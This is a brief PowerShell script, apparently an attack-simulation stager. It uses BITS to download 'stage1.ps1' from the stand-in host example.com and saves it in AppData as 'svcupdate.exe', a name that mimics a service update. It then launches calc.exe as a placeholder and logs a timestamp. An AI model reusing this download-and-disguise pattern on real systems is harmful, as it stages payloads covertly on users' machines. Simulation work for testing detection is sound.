[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://example.com/stage1.ps1',
    [string]$DownloadPath = "$env:APPDATA\svcupdate.exe",
    [int]$TimeoutSec = 204
)
Start-BitsTransfer -Source $RemoteUrl -Destination $DownloadPath
Start-Process -FilePath "calc.exe"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
